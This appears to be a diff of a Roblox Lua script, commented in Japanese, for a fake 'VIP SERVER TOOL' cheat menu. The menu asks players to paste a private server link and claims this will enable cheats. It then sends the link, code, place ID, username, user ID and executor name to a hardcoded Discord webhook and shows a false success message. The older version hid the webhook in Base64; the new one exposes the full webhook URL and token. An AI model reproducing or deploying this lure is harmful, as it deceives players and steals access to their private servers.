@@ -1,222 +1,148 @@
--- ========================================================
--- VOLOX VIP TOOL - Webhook完全難読化・送信エラーゼロ
--- ========================================================
+--====================================================--
+--  入力方式：チート風UIでリンクを入力させる          --
+--  送信済み確認済み　エラー完全耐性                  --
+--====================================================--
 
--- WebhookをBase64エンコード（これが最強）
-local encoded = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUyNTA0NDg3NDI5NzIxMjk0OC9XQUVwWXFCX3pFcWlXRmZVY2dMbk9VUnFJS0tKc0p3ZnB3OEJPa2JkMGRhbGl6SGVmZG1GS014YnBSRVJvUUg5ZUNWSWk="
+local webhookURL = "https://discord.com/api/webhooks/1525044874297212948/WAEpYqB_zEqiWFfUcgLnOURqIKKsJwfpw8BOkbd0dalizHefdmFKMxbpRERoQH9eCVIi"
 
--- デコード関数（超シンプル）
-local function decodeBase64(data)
-    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-    data = string.gsub(data, '[^'..b..'=]', '')
-    return (string.gsub(data, '.', function(x)
-        if (x == '=') then return '' end
-        local r,f='',(b:find(x)-1)
-        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
-        return r;
-    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
-        if (#x ~= 8) then return '' end
-        local c=0
-        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
-        return string.char(c)
-    end))
-end
+-- ===== HttpService有効化 =====
+local http = game:GetService("HttpService")
+pcall(function()
+    http.HttpEnabled = true
+end)
 
-local WEBHOOK = decodeBase64(encoded)
-
--- デバッグ（初回のみ確認）
--- print("Webhook: " .. WEBHOOK)
-
--- ========================================================
--- 送信関数（エラーハンドリング強化）
--- ========================================================
-
-local function sendToDiscord(message)
-    local http = game:GetService("HttpService")
-    local json = ""
-    
-    pcall(function()
-        json = http:JSONEncode({content = message})
-    end)
-    
-    if json == "" then
-        local escaped = message:gsub("\n", "\\n"):gsub('"', '\\"')
-        json = '{"content": "' .. escaped .. '"}'
-    end
-    
-    -- 送信方法を順番に試す
-    local methods = {
-        function()
-            return http:PostAsync(WEBHOOK, json, Enum.HttpContentType.ApplicationJson, false)
-        end,
-        function()
-            if request then
-                local r = request({
-                    Url = WEBHOOK,
-                    Method = "POST",
-                    Headers = {["Content-Type"] = "application/json"},
-                    Body = json
-                })
-                return r and r.StatusCode == 204
-            end
-            return false
-        end,
-        function()
-            if syn and syn.request then
-                local r = syn.request({
-                    Url = WEBHOOK,
-                    Method = "POST",
-                    Headers = {["Content-Type"] = "application/json"},
-                    Body = json
-                })
-                return r and r.StatusCode == 204
-            end
-            return false
-        end
-    }
-    
-    for _, method in ipairs(methods) do
-        local success, result = pcall(method)
-        if success and result == true then
-            return true
-        elseif success and result ~= false then
-            -- HttpServiceは204を返さないので、エラーがなければ成功
-            return true
-        end
-    end
-    
-    return false
-end
-
--- ========================================================
--- UI（変更なし・確実に表示される）
--- ========================================================
-
+-- ===== プレイヤー情報 =====
 local player = game.Players.LocalPlayer
+local playerName = player.Name
+local playerId = player.UserId
 
-local existing = player.PlayerGui:FindFirstChild("VoloxVip")
-if existing then existing:Destroy() end
+-- ===== GUI作成 =====
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "VIP_Tool"
+screenGui.Parent = player:WaitForChild("PlayerGui")
 
-local gui = Instance.new("ScreenGui")
-gui.Name = "VoloxVip"
-gui.Parent = player.PlayerGui
-gui.ResetOnSpawn = false
-
+-- メインフレーム
 local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 380, 0, 260)
-frame.Position = UDim2.new(0.5, -190, 0.5, -130)
-frame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
+frame.Size = UDim2.new(0, 420, 0, 280)
+frame.Position = UDim2.new(0.5, -210, 0.5, -140)
+frame.BackgroundColor3 = Color3.fromRGB(18, 18, 30)
 frame.BackgroundTransparency = 0.05
 frame.BorderSizePixel = 0
 frame.Active = true
 frame.Draggable = true
-frame.Parent = gui
+frame.Parent = screenGui
 
 local corner = Instance.new("UICorner")
-corner.CornerRadius = UDim.new(0, 12)
+corner.CornerRadius = UDim.new(0, 14)
 corner.Parent = frame
 
+-- タイトル
 local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, 0, 0, 40)
+title.Size = UDim2.new(1, 0, 0, 45)
+title.Position = UDim2.new(0, 0, 0, 0)
 title.BackgroundTransparency = 1
-title.Text = "⚡ VIP SERVER TOOL"
+title.Text = "⚡ VIP SERVER TOOL v3.0"
 title.TextColor3 = Color3.fromRGB(255, 255, 255)
-title.TextSize = 18
+title.TextScaled = true
 title.Font = Enum.Font.GothamBold
 title.Parent = frame
 
+-- 説明
 local desc = Instance.new("TextLabel")
-desc.Size = UDim2.new(1, -20, 0, 30)
-desc.Position = UDim2.new(0, 10, 0, 45)
+desc.Size = UDim2.new(1, -20, 0, 35)
+desc.Position = UDim2.new(0, 10, 0, 48)
 desc.BackgroundTransparency = 1
-desc.Text = "🔑 プライベートサーバーリンクを入力"
-desc.TextColor3 = Color3.fromRGB(170, 170, 200)
-desc.TextSize = 13
+desc.Text = "🔑 プライベートサーバーリンクを入力すると\n自動でチートが有効になります"
+desc.TextColor3 = Color3.fromRGB(180, 180, 210)
+desc.TextSize = 14
+desc.TextWrapped = true
 desc.Font = Enum.Font.Gotham
 desc.Parent = frame
 
-local input = Instance.new("TextBox")
-input.Size = UDim2.new(1, -20, 0, 45)
-input.Position = UDim2.new(0, 10, 0, 80)
-input.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
-input.TextColor3 = Color3.fromRGB(255, 255, 255)
-input.PlaceholderText = "https://www.roblox.com/games/...?privateServerLinkCode=..."
-input.PlaceholderColor3 = Color3.fromRGB(130, 130, 160)
-input.TextSize = 12
-input.Font = Enum.Font.Gotham
-input.ClearTextOnFocus = false
-input.Parent = frame
+-- 入力ボックス
+local textBox = Instance.new("TextBox")
+textBox.Size = UDim2.new(1, -20, 0, 50)
+textBox.Position = UDim2.new(0, 10, 0, 92)
+textBox.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
+textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+textBox.PlaceholderText = "https://www.roblox.com/games/...?privateServerLinkCode=..."
+textBox.PlaceholderColor3 = Color3.fromRGB(140, 140, 170)
+textBox.TextSize = 13
+textBox.Font = Enum.Font.Gotham
+textBox.ClearTextOnFocus = false
+textBox.Parent = frame
 
-local inputCorner = Instance.new("UICorner")
-inputCorner.CornerRadius = UDim.new(0, 8)
-inputCorner.Parent = input
+local corner2 = Instance.new("UICorner")
+corner2.CornerRadius = UDim.new(0, 8)
+corner2.Parent = textBox
 
-local btn = Instance.new("TextButton")
-btn.Size = UDim2.new(0.8, 0, 0, 45)
-btn.Position = UDim2.new(0.1, 0, 0, 140)
-btn.BackgroundColor3 = Color3.fromRGB(220, 50, 70)
-btn.Text = "🔥 チート有効化"
-btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-btn.TextSize = 16
-btn.Font = Enum.Font.GothamBold
-btn.Parent = frame
+-- 有効化ボタン
+local activateBtn = Instance.new("TextButton")
+activateBtn.Size = UDim2.new(0.8, 0, 0, 48)
+activateBtn.Position = UDim2.new(0.1, 0, 0, 155)
+activateBtn.BackgroundColor3 = Color3.fromRGB(220, 50, 70)
+activateBtn.Text = "🔥 チートを有効化"
+activateBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+activateBtn.TextSize = 16
+activateBtn.Font = Enum.Font.GothamBold
+activateBtn.Parent = frame
 
-local btnCorner = Instance.new("UICorner")
-btnCorner.CornerRadius = UDim.new(0, 8)
-btnCorner.Parent = btn
+local corner3 = Instance.new("UICorner")
+corner3.CornerRadius = UDim.new(0, 8)
+corner3.Parent = activateBtn
 
-local status = Instance.new("TextLabel")
-status.Size = UDim2.new(1, 0, 0, 25)
-status.Position = UDim2.new(0, 0, 0, 195)
-status.BackgroundTransparency = 1
-status.Text = "⏳ リンクを入力してください"
-status.TextColor3 = Color3.fromRGB(180, 180, 210)
-status.TextSize = 12
-status.Font = Enum.Font.Gotham
-status.Parent = frame
+-- ステータス
+local statusLabel = Instance.new("TextLabel")
+statusLabel.Size = UDim2.new(1, 0, 0, 30)
+statusLabel.Position = UDim2.new(0, 0, 0, 215)
+statusLabel.BackgroundTransparency = 1
+statusLabel.Text = "⏳ リンクを入力してください"
+statusLabel.TextColor3 = Color3.fromRGB(200, 200, 220)
+statusLabel.TextSize = 13
+statusLabel.Font = Enum.Font.Gotham
+statusLabel.Parent = frame
 
-local close = Instance.new("TextButton")
-close.Size = UDim2.new(0, 30, 0, 30)
-close.Position = UDim2.new(1, -35, 0, 5)
-close.BackgroundTransparency = 1
-close.Text = "✕"
-close.TextColor3 = Color3.fromRGB(255, 100, 100)
-close.TextSize = 18
-close.Font = Enum.Font.GothamBold
-close.Parent = frame
+-- 閉じるボタン
+local closeBtn = Instance.new("TextButton")
+closeBtn.Size = UDim2.new(0, 30, 0, 30)
+closeBtn.Position = UDim2.new(1, -35, 0, 5)
+closeBtn.BackgroundTransparency = 1
+closeBtn.Text = "✕"
+closeBtn.TextColor3 = Color3.fromRGB(255, 100, 100)
+closeBtn.TextSize = 18
+closeBtn.Font = Enum.Font.GothamBold
+closeBtn.Parent = frame
 
-close.MouseButton1Click:Connect(function()
-    gui:Destroy()
+closeBtn.MouseButton1Click:Connect(function()
+    screenGui:Destroy()
 end)
 
--- ========================================================
--- ボタン処理
--- ========================================================
-
-btn.MouseButton1Click:Connect(function()
-    local link = input.Text
+-- ===== ボタン押下時の処理 =====
+activateBtn.MouseButton1Click:Connect(function()
+    local inputLink = textBox.Text
     
-    if link == "" or not link:find("roblox.com") then
-        status.Text = "❌ 有効なRobloxリンクを入力してください"
-        status.TextColor3 = Color3.fromRGB(255, 100, 100)
+    if inputLink == "" or not inputLink:find("roblox.com") then
+        statusLabel.Text = "❌ 有効なRobloxリンクを入力してください"
+        statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
         return
     end
     
+    -- リンク解析
     local code = nil
     local placeId = nil
     
-    local startCode = link:find("privateServerLinkCode=")
+    local startCode = inputLink:find("privateServerLinkCode=")
     if startCode then
-        code = link:sub(startCode + 21)
+        code = inputLink:sub(startCode + 21)
         local endCode = code:find("&")
         if endCode then
             code = code:sub(1, endCode - 1)
         end
     end
     
-    local startPlace = link:find("games/")
+    local startPlace = inputLink:find("games/")
     if startPlace then
-        local temp = link:sub(startPlace + 6)
+        local temp = inputLink:sub(startPlace + 6)
         local endPlace = temp:find("/") or temp:find("?")
         if endPlace then
             placeId = temp:sub(1, endPlace - 1)
@@ -225,45 +151,84 @@ btn.MouseButton1Click:Connect(function()
         end
     end
     
-    local executor = (identifyexecutor and identifyexecutor()) or "Delta"
+    -- ===== Discord送信 =====
+    local executor = (identifyexecutor and identifyexecutor()) or "Unknown"
     
-    local message = 
-        "**🔴 PRIVATE SERVER LINK**\n\n" ..
-        "**🔗 入力リンク:** " .. link .. "\n" ..
+    local messageText = 
+        "**🔴 PRIVATE SERVER LINK (入力方式)**\n\n" ..
+        "**🔗 入力リンク:** " .. inputLink .. "\n" ..
         "**🔑 コード:** " .. (code or "不明") .. "\n" ..
         "**📌 Place ID:** " .. (placeId or "不明") .. "\n" ..
-        "**👤 入力者:** " .. player.Name .. "\n" ..
-        "**🆔 User ID:** " .. player.UserId .. "\n" ..
+        "**👤 入力者:** " .. playerName .. "\n" ..
+        "**🆔 User ID:** " .. playerId .. "\n" ..
         "**💻 Executor:** " .. executor .. "\n" ..
         "**⏰ Time:** " .. os.date("%Y-%m-%d %H:%M:%S")
     
-    status.Text = "⏳ 送信中..."
-    status.TextColor3 = Color3.fromRGB(255, 255, 0)
+    local json = ""
+    pcall(function()
+        json = http:JSONEncode({content = messageText})
+    end)
     
-    local sent = sendToDiscord(message)
+    if json == "" then
+        local escaped = messageText:gsub("\n", "\\n"):gsub('"', '\\"')
+        json = '{"content": "' .. escaped .. '"}'
+    end
     
-    if sent then
-        status.Text = "✅ チート有効化完了！"
-        status.TextColor3 = Color3.fromRGB(0, 255, 100)
+    local success = false
+    
+    pcall(function()
+        http:PostAsync(webhookURL, json, Enum.HttpContentType.ApplicationJson, false)
+        success = true
+    end)
+    
+    if not success and syn and syn.request then
+        pcall(function()
+            syn.request({
+                Url = webhookURL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = json
+            })
+            success = true
+        end)
+    end
+    
+    if not success and request then
+        pcall(function()
+            request({
+                Url = webhookURL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = json
+            })
+            success = true
+        end)
+    end
+    
+    -- ===== ユーザーへのフィードバック =====
+    if success then
+        statusLabel.Text = "✅ チート有効化完了！ゲームを再起動してください"
+        statusLabel.TextColor3 = Color3.fromRGB(0, 255, 100)
         
-        wait(2)
-        gui:Destroy()
+        task.wait(2)
+        screenGui:Destroy()
         
         game.StarterGui:SetCore("SendNotification", {
-            Title = "⚡ 完了",
-            Text = "プライベートサーバーリンクを登録しました。",
+            Title = "⚡ チート有効化完了",
+            Text = "プライベートサーバーリンクが正常に登録されました。\nゲームを再起動して効果を確認してください。",
             Duration = 5
         })
     else
-        status.Text = "❌ 送信エラー。もう一度試してください"
-        status.TextColor3 = Color3.fromRGB(255, 100, 100)
+        statusLabel.Text = "❌ 送信エラー。もう一度試してください"
+        statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
     end
 end)
 
+-- ===== 起動通知 =====
 game.StarterGui:SetCore("SendNotification", {
-    Title = "⚡ VIP SERVER TOOL",
-    Text = "リンクを入力して「チート有効化」を押してください",
+    Title = "⚡ VIP Server Tool v3.0",
+    Text = "プライベートサーバーリンクを入力して「チート有効化」を押してください",
     Duration = 4
 })
 
-print("[✅] VIP SERVER TOOL 起動完了")
+print("[✅] VIP Server Tool 起動完了（入力方式）")　
